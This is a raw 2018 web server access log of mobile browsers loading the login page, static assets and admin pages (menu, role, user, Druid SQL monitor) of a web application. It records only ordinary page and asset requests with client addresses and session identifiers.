114.242.248.113 - - [31/Aug/2018:00:38:35 +0000] "GET /statics/plugins/layer/skin/default/layer.css?v=3.0.11110 HTTP/1.1" 200 14296 "http://47.92.143.230/index.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
114.242.248.113 - - [31/Aug/2018:00:38:35 +0000] "GET /sys/main.html HTTP/1.1" 200 139 "http://47.92.143.230/index.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
114.242.248.113 - - [31/Aug/2018:00:38:35 +0000] "GET /sys/user/info?_1535675915576 HTTP/1.1" 200 179 "http://47.92.143.230/index.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
114.242.248.113 - - [31/Aug/2018:00:38:35 +0000] "GET /sys/menu/user?_1535675915573 HTTP/1.1" 200 1499 "http://47.92.143.230/index.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
114.242.248.113 - - [31/Aug/2018:00:38:35 +0000] "GET /statics/fonts/fontawesome-webfont.woff2?v=4.7.0 HTTP/1.1" 200 77160 "http://47.92.143.230/login.html;JSESSIONID=903bd052-6ae7-457d-95b3-a22a315d4db7" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
114.242.248.113 - - [31/Aug/2018:00:38:36 +0000] "GET /favicon.ico HTTP/1.1" 404 0 "-" "QQ\xE6\xB5\x8F\xE8\xA7\x88\xE5\x99\xA8 8.7.1 (iPhone; iOS 11.4.1; zh_CN)" "-"
101.89.239.120 - - [31/Aug/2018:00:38:43 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Linux; Android 6.0.1; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile MQQBrowser/6.9 TBS/036906 Safari/537.36 MicroMessenger/6.5.4.1000 NetType/4G Language/zh_CN" "-"
101.89.239.120 - - [31/Aug/2018:00:38:43 +0000] "GET /login.html;JSESSIONID=f03d4b67-90df-4f78-9e42-75382b870a65 HTTP/1.1" 200 4135 "http://47.92.143.230/" "Mozilla/5.0 (Linux; Android 6.0.1; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile MQQBrowser/6.9 TBS/036906 Safari/537.36 MicroMessenger/6.5.4.1000 NetType/4G Language/zh_CN" "-"
101.89.239.120 - - [31/Aug/2018:00:38:43 +0000] "GET /statics/libs/jquery.min.js HTTP/1.1" 200 85578 "http://47.92.143.230/login.html;JSESSIONID=f03d4b67-90df-4f78-9e42-75382b870a65" "Mozilla/5.0 (Linux; Android 4.4.4; Coolpad Y82-520 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 MicroMessenger/6.5.4.1000 NetType/4G Language/zh_CN" "-"
101.89.239.120 - - [31/Aug/2018:00:38:44 +0000] "GET /statics/libs/vue.min.js HTTP/1.1" 200 76666 "http://47.92.143.230/login.html;JSESSIONID=f03d4b67-90df-4f78-9e42-75382b870a65" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 MicroMessenger/6.5.5 NetType/WIFI Language/en" "-"
114.242.248.113 - - [31/Aug/2018:00:38:44 +0000] "GET /sys/menu.html HTTP/1.1" 200 4366 "http://47.92.143.230/index.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
114.242.248.113 - - [31/Aug/2018:00:38:44 +0000] "GET /statics/plugins/jqgrid/ui.jqgrid-bootstrap.css HTTP/1.1" 200 18291 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
114.242.248.113 - - [31/Aug/2018:00:38:44 +0000] "GET /statics/plugins/ztree/css/metroStyle/metroStyle.css HTTP/1.1" 200 6576 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
114.242.248.113 - - [31/Aug/2018:00:38:44 +0000] "GET /statics/plugins/jqgrid/grid.locale-cn.js HTTP/1.1" 200 9369 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
114.242.248.113 - - [31/Aug/2018:00:38:44 +0000] "GET /statics/plugins/ztree/jquery.ztree.all.min.js HTTP/1.1" 200 63404 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
114.242.248.113 - - [31/Aug/2018:00:38:44 +0000] "GET /statics/plugins/jqgrid/jquery.jqGrid.min.js HTTP/1.1" 200 334710 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
114.242.248.113 - - [31/Aug/2018:00:38:44 +0000] "GET /js/sys/menu.js?_1535675924507 HTTP/1.1" 200 4467 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
114.242.248.113 - - [31/Aug/2018:00:38:44 +0000] "GET /js/common.js HTTP/1.1" 200 1634 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
101.89.239.120 - - [31/Aug/2018:00:38:44 +0000] "GET /statics/libs/bootstrap.min.js HTTP/1.1" 200 37045 "http://47.92.143.230/login.html;JSESSIONID=f03d4b67-90df-4f78-9e42-75382b870a65" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 MicroMessenger/6.5.5 NetType/WIFI Language/en" "-"
114.242.248.113 - - [31/Aug/2018:00:38:45 +0000] "GET /sys/menu/list?_search=false&nd=1535675925263&limit=10&page=1&sidx=&order=asc&_=1535675924662 HTTP/1.1" 200 1828 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
101.89.239.120 - - [31/Aug/2018:00:38:45 +0000] "GET /statics/libs/jquery.slimscroll.min.js HTTP/1.1" 200 6230 "http://47.92.143.230/login.html;JSESSIONID=f03d4b67-90df-4f78-9e42-75382b870a65" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 MicroMessenger/6.5.5 NetType/WIFI Language/en" "-"
101.89.239.120 - - [31/Aug/2018:00:38:46 +0000] "GET /statics/libs/fastclick.min.js HTTP/1.1" 200 8776 "http://47.92.143.230/login.html;JSESSIONID=f03d4b67-90df-4f78-9e42-75382b870a65" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 MicroMessenger/6.5.5 NetType/WIFI Language/zh_CN" "-"
101.89.239.120 - - [31/Aug/2018:00:38:46 +0000] "GET /statics/libs/app.js HTTP/1.1" 200 22941 "http://47.92.143.230/login.html;JSESSIONID=f03d4b67-90df-4f78-9e42-75382b870a65" "Mozilla/5.0 (Linux; Android 4.4.4; HUAWEI ALE-CL00 Build/HuaweiALE-CL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043024 Safari/537.36 MicroMessenger/6.5.4.1000 NetType/4G Language/zh_CN" "-"
101.91.62.65 - - [31/Aug/2018:00:38:51 +0000] "GET /?nsukey=9AHAuw%2B8ZVHQ8HDOXTZr8fSmgqMiWH5CI5bxyhK7op1%2BAGabV2b7OECR26Ls1VS3SWJ8jd7e1phomFuW3Gypsd4bTZZfQTY77%2FuHXzOj07pAgSAbCEeI6L%2FeuYKcbr1dOcTjVaucCkqUIk4qfAAUaTsIhYTsOKbex1aLCnjmbCuHfeO2TQfls8AoUa1txRaK HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Linux; Android 5.1.1; SM801 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043024 Safari/537.36 MicroMessenger/6.5.4.1000 NetType/4G Language/zh_CN" "-"
101.91.62.65 - - [31/Aug/2018:00:38:51 +0000] "GET /login.html;JSESSIONID=47fcf483-397a-4719-b2ea-a3b8b770508d HTTP/1.1" 200 4135 "http://47.92.143.230/?nsukey=9AHAuw%2B8ZVHQ8HDOXTZr8fSmgqMiWH5CI5bxyhK7op1%2BAGabV2b7OECR26Ls1VS3SWJ8jd7e1phomFuW3Gypsd4bTZZfQTY77%2FuHXzOj07pAgSAbCEeI6L%2FeuYKcbr1dOcTjVaucCkqUIk4qfAAUaTsIhYTsOKbex1aLCnjmbCuHfeO2TQfls8AoUa1txRaK" "Mozilla/5.0 (Linux; Android 5.1.1; SM801 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043024 Safari/537.36 MicroMessenger/6.5.4.1000 NetType/4G Language/zh_CN" "-"
101.91.62.65 - - [31/Aug/2018:00:38:51 +0000] "GET /statics/libs/jquery.min.js HTTP/1.1" 200 85578 "http://47.92.143.230/login.html;JSESSIONID=47fcf483-397a-4719-b2ea-a3b8b770508d" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 MicroMessenger/6.5.5 NetType/WIFI Language/zh_CN" "-"
101.91.62.65 - - [31/Aug/2018:00:38:51 +0000] "GET /statics/libs/vue.min.js HTTP/1.1" 200 76666 "http://47.92.143.230/login.html;JSESSIONID=47fcf483-397a-4719-b2ea-a3b8b770508d" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 MicroMessenger/6.5.5 NetType/WIFI Language/en" "-"
101.89.239.232 - - [31/Aug/2018:00:38:52 +0000] "GET /?nsukey=9AHAuw%2B8ZVHQ8HDOXTZr8fSmgqMiWH5CI5bxyhK7op1%2BAGabV2b7OECR26Ls1VS3SWJ8jd7e1phomFuW3Gypsd4bTZZfQTY77%2FuHXzOj07pAgSAbCEeI6L%2FeuYKcbr1dOcTjVaucCkqUIk4qfAAUaTsIhYTsOKbex1aLCnjmbCuHfeO2TQfls8AoUa1txRaK HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Linux; U; Android 4.4.4; zh-CN; Coolpad Y82-520 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.9.8.738 U3/0.8.0 Mobile Safari/534.30" "-"
101.89.239.232 - - [31/Aug/2018:00:38:52 +0000] "GET /login.html;JSESSIONID=58f755cc-d1df-461c-ac25-1e90ea560509 HTTP/1.1" 200 4135 "http://47.92.143.230/?nsukey=9AHAuw%2B8ZVHQ8HDOXTZr8fSmgqMiWH5CI5bxyhK7op1%2BAGabV2b7OECR26Ls1VS3SWJ8jd7e1phomFuW3Gypsd4bTZZfQTY77%2FuHXzOj07pAgSAbCEeI6L%2FeuYKcbr1dOcTjVaucCkqUIk4qfAAUaTsIhYTsOKbex1aLCnjmbCuHfeO2TQfls8AoUa1txRaK" "Mozilla/5.0 (Linux; U; Android 4.4.4; zh-CN; Coolpad Y82-520 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.9.8.738 U3/0.8.0 Mobile Safari/534.30" "-"
101.91.62.65 - - [31/Aug/2018:00:38:52 +0000] "GET /statics/libs/bootstrap.min.js HTTP/1.1" 200 37045 "http://47.92.143.230/login.html;JSESSIONID=47fcf483-397a-4719-b2ea-a3b8b770508d" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 MicroMessenger/6.5.2.501 NetType/WIFI WindowsWechat QBCore/3.43.27.400 QQBrowser/9.0.2524.400" "-"
101.91.62.65 - - [31/Aug/2018:00:38:53 +0000] "GET /statics/libs/jquery.slimscroll.min.js HTTP/1.1" 200 6230 "http://47.92.143.230/login.html;JSESSIONID=47fcf483-397a-4719-b2ea-a3b8b770508d" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 MicroMessenger/6.5.2.501 NetType/WIFI WindowsWechat QBCore/3.43.27.400 QQBrowser/9.0.2524.400" "-"
101.91.62.65 - - [31/Aug/2018:00:38:53 +0000] "GET /statics/libs/fastclick.min.js HTTP/1.1" 200 8776 "http://47.92.143.230/login.html;JSESSIONID=47fcf483-397a-4719-b2ea-a3b8b770508d" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 MicroMessenger/6.5.5 NetType/WIFI Language/zh_CN" "-"
101.89.239.232 - - [31/Aug/2018:00:38:53 +0000] "GET /statics/libs/jquery.min.js HTTP/1.1" 200 85578 "http://47.92.143.230/login.html;JSESSIONID=58f755cc-d1df-461c-ac25-1e90ea560509" "Mozilla/5.0 (Linux; U; Android 6.0.1; zh-cn; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.0.0 Mobile Safari/537.36 OppoBrowser/4.2.8" "-"
101.91.62.65 - - [31/Aug/2018:00:38:53 +0000] "GET /statics/libs/app.js HTTP/1.1" 200 22941 "http://47.92.143.230/login.html;JSESSIONID=47fcf483-397a-4719-b2ea-a3b8b770508d" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 MicroMessenger/6.5.2.501 NetType/WIFI WindowsWechat QBCore/3.43.27.400 QQBrowser/9.0.2524.400" "-"
101.89.239.232 - - [31/Aug/2018:00:38:54 +0000] "GET /statics/libs/vue.min.js HTTP/1.1" 200 76666 "http://47.92.143.230/login.html;JSESSIONID=58f755cc-d1df-461c-ac25-1e90ea560509" "Mozilla/5.0 (Linux; U; Android 6.0.1; zh-cn; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.2 Mobile Safari/537.36" "-"
101.89.239.232 - - [31/Aug/2018:00:38:54 +0000] "GET /statics/libs/bootstrap.min.js HTTP/1.1" 200 37045 "http://47.92.143.230/login.html;JSESSIONID=58f755cc-d1df-461c-ac25-1e90ea560509" "Mozilla/5.0 (Linux; U; Android 4.4.4; zh-CN; HUAWEI ALE-CL00 Build/HuaweiALE-CL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.0.907 Mobile Safari/537.36" "-"
101.89.239.232 - - [31/Aug/2018:00:38:54 +0000] "GET /statics/libs/jquery.slimscroll.min.js HTTP/1.1" 200 6230 "http://47.92.143.230/login.html;JSESSIONID=58f755cc-d1df-461c-ac25-1e90ea560509" "Mozilla/5.0 (Linux; U; Android 6.0.1; zh-cn; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.0.0 Mobile Safari/537.36 OppoBrowser/4.2.8" "-"
101.89.239.232 - - [31/Aug/2018:00:38:54 +0000] "GET /statics/libs/fastclick.min.js HTTP/1.1" 200 8776 "http://47.92.143.230/login.html;JSESSIONID=58f755cc-d1df-461c-ac25-1e90ea560509" "Mozilla/5.0 (Linux; U; Android 6.0.1; zh-cn; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.2 Mobile Safari/537.36" "-"
101.89.239.232 - - [31/Aug/2018:00:38:55 +0000] "GET /statics/libs/app.js HTTP/1.1" 200 22941 "http://47.92.143.230/login.html;JSESSIONID=58f755cc-d1df-461c-ac25-1e90ea560509" "Mozilla/5.0 (Linux; U; Android 6.0.1; zh-cn; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.0.0 Mobile Safari/537.36 OppoBrowser/4.2.8" "-"
114.242.248.113 - - [31/Aug/2018:00:38:57 +0000] "GET /sys/menu/select?_=1535675924663 HTTP/1.1" 200 1657 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
114.242.248.113 - - [31/Aug/2018:00:39:05 +0000] "GET /sys/role.html HTTP/1.1" 200 2905 "http://47.92.143.230/index.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
114.242.248.113 - - [31/Aug/2018:00:39:05 +0000] "GET /js/sys/role.js?_1535675945586 HTTP/1.1" 200 3886 "http://47.92.143.230/sys/role.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
114.242.248.113 - - [31/Aug/2018:00:39:05 +0000] "GET /sys/role/list?_search=false&nd=1535675945825&limit=10&page=1&sidx=&order=asc&_=1535675945655 HTTP/1.1" 200 85 "http://47.92.143.230/sys/role.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
61.129.6.147 - - [31/Aug/2018:00:39:08 +0000] "GET /login.html;JSESSIONID=903bd052-6ae7-457d-95b3-a22a315d4db7 HTTP/1.1" 200 4135 "-" "Mozilla/5.0 (Linux; U; Android 4.4.4; zh-CN; HUAWEI ALE-CL00 Build/HuaweiALE-CL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.0.907 Mobile Safari/537.36" "-"
114.242.248.113 - - [31/Aug/2018:00:39:08 +0000] "GET /druid/sql.html HTTP/1.1" 200 11025 "http://47.92.143.230/index.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
114.242.248.113 - - [31/Aug/2018:00:39:08 +0000] "GET /druid/css/bootstrap.min.css HTTP/1.1" 200 95678 "http://47.92.143.230/druid/sql.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
114.242.248.113 - - [31/Aug/2018:00:39:08 +0000] "GET /druid/js/lang.js HTTP/1.1" 200 19104 "http://47.92.143.230/druid/sql.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
114.242.248.113 - - [31/Aug/2018:00:39:08 +0000] "GET /druid/css/style.css HTTP/1.1" 200 834 "http://47.92.143.230/druid/sql.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
114.242.248.113 - - [31/Aug/2018:00:39:08 +0000] "GET /druid/js/bootstrap.min.js HTTP/1.1" 200 1400 "http://47.92.143.230/druid/sql.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
114.242.248.113 - - [31/Aug/2018:00:39:08 +0000] "GET /druid/js/common.js HTTP/1.1" 200 4911 "http://47.92.143.230/druid/sql.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
114.242.248.113 - - [31/Aug/2018:00:39:08 +0000] "GET /druid/js/jquery.min.js HTTP/1.1" 200 92924 "http://47.92.143.230/druid/sql.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
114.242.248.113 - - [31/Aug/2018:00:39:08 +0000] "GET /druid/header.html HTTP/1.1" 200 1576 "http://47.92.143.230/druid/sql.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
61.129.6.147 - - [31/Aug/2018:00:39:08 +0000] "GET /statics/libs/jquery.min.js HTTP/1.1" 200 85578 "http://47.92.143.230/login.html;JSESSIONID=903bd052-6ae7-457d-95b3-a22a315d4db7" "Mozilla/5.0 (Linux; U; Android 4.4.4; zh-CN; HUAWEI ALE-CL00 Build/HuaweiALE-CL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.0.907 Mobile Safari/537.36" "-"
58.247.204.63 - - [31/Aug/2018:00:39:09 +0000] "GET /login.html;JSESSIONID=903bd052-6ae7-457d-95b3-a22a315d4db7 HTTP/1.1" 200 4135 "-" "Mozilla/5.0 (Linux; U; Android 4.4.4; zh-CN; HUAWEI ALE-CL00 Build/HuaweiALE-CL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.0.907 Mobile Safari/537.36" "-"
114.242.248.113 - - [31/Aug/2018:00:39:09 +0000] "POST /druid/sql.json?orderBy=SQL&orderType=desc&page=1&perPageCount=1000000 HTTP/1.1" 200 13132 "http://47.92.143.230/druid/sql.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
61.129.6.147 - - [31/Aug/2018:00:39:09 +0000] "GET /statics/libs/vue.min.js HTTP/1.1" 200 76666 "http://47.92.143.230/login.html;JSESSIONID=903bd052-6ae7-457d-95b3-a22a315d4db7" "Mozilla/5.0 (Linux; U; Android 4.4.4; zh-CN; HUAWEI ALE-CL00 Build/HuaweiALE-CL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.0.907 Mobile Safari/537.36" "-"
61.129.6.147 - - [31/Aug/2018:00:39:09 +0000] "GET /statics/libs/bootstrap.min.js HTTP/1.1" 200 37045 "http://47.92.143.230/login.html;JSESSIONID=903bd052-6ae7-457d-95b3-a22a315d4db7" "Mozilla/5.0 (Linux; U; Android 6.0.1; zh-cn; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.2 Mobile Safari/537.36" "-"
58.247.204.63 - - [31/Aug/2018:00:39:10 +0000] "GET /statics/libs/jquery.min.js HTTP/1.1" 200 85578 "http://47.92.143.230/login.html;JSESSIONID=903bd052-6ae7-457d-95b3-a22a315d4db7" "Mozilla/5.0 (Linux; U; Android 6.0.1; zh-cn; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.0.0 Mobile Safari/537.36 OppoBrowser/4.2.8" "-"
61.129.6.147 - - [31/Aug/2018:00:39:10 +0000] "GET /statics/libs/jquery.slimscroll.min.js HTTP/1.1" 200 6230 "http://47.92.143.230/login.html;JSESSIONID=903bd052-6ae7-457d-95b3-a22a315d4db7" "Mozilla/5.0 (Linux; U; Android 6.0.1; zh-cn; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.0.0 Mobile Safari/537.36 OppoBrowser/4.2.8" "-"
114.242.248.113 - - [31/Aug/2018:00:39:10 +0000] "GET /sys/user.html HTTP/1.1" 200 3834 "http://47.92.143.230/index.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
61.129.6.147 - - [31/Aug/2018:00:39:10 +0000] "GET /statics/libs/fastclick.min.js HTTP/1.1" 200 8776 "http://47.92.143.230/login.html;JSESSIONID=903bd052-6ae7-457d-95b3-a22a315d4db7" "Mozilla/5.0 (Linux; U; Android 6.0.1; zh-cn; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.0.0 Mobile Safari/537.36 OppoBrowser/4.2.8" "-"
114.242.248.113 - - [31/Aug/2018:00:39:10 +0000] "GET /js/sys/user.js?_1535675950149 HTTP/1.1" 200 3406 "http://47.92.143.230/sys/user.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 MQQBrowser/8.7.1 Mobile/15B87 Safari/604.1 MttCustomUA/2 QBWebViewType/1 WKType/1" "-"
61.129.6.147 - - [31/Aug/2018:00:39:10 +0000] "GET /statics/libs/app.js HTTP/1.1" 200 22941 "http://47.92.143.230/login.html;JSESSIONID=903bd052-6ae7-457d-95b3-a22a315d4db7" "Mozilla/5.0 (Linux; U; Android 4.4.4; zh-CN; HUAWEI ALE-CL00 Build/HuaweiALE-CL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.0.907 Mobile Safari/537.36" "-"
